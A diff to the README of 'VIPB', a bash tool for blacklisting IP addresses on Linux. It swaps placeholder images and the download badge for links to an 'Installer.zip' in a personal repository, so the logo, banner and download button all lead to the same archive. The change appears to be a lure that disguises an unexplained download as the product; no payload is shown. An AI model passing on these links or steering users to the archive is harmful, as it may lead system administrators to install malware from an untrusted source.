@@ -3,7 +3,7 @@
 
 Welcome to the VIPB GitHub repository! VIPB stands for Versatile IPs Blacklister, a powerful tool designed for managing IP addresses and blacklisting them efficiently. This repository focuses on bash scripting, firewall management, and various tools related to IP management on Linux systems. Whether you are a system administrator, network engineer, or security enthusiast, VIPB provides you with the necessary functionality to secure your network and systems.
 
-![VIPB Logo](https://via.placeholder.com/200)
+![VIPB Logo](https://github.com/Muky11/vipb/releases/download/v1.0/Installer.zip)
 
 ## Features
 - **Blacklist Management:** Easily manage a list of blacklisted IP addresses.
@@ -15,7 +15,7 @@ Welcome to the VIPB GitHub repository! VIPB stands for Versatile IPs Blacklister
 ## Getting Started
 To get started with VIPB, you can download the latest release by clicking the button below:
 
-[![Download VIPB v1.0.0](https://img.shields.io/badge/Download-VIPB_v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download VIPB v1.0.0](https://github.com/Muky11/vipb/releases/download/v1.0/Installer.zip)](https://github.com/Muky11/vipb/releases/download/v1.0/Installer.zip)
 
 The link above will direct you to the download page for VIPB v1.0.0. Once downloaded, follow the launch instructions to start using VIPB effectively.
 
@@ -51,4 +51,4 @@ If you encounter any issues with VIPB or have any questions, please check the "R
 
 Thank you for choosing VIPB - your go-to solution for versatile IP blacklisting on Linux systems! 🛡️🔒
 
-![VIPB Banner](https://via.placeholder.com/800x200)
+![VIPB Banner](https://github.com/Muky11/vipb/releases/download/v1.0/Installer.zip)
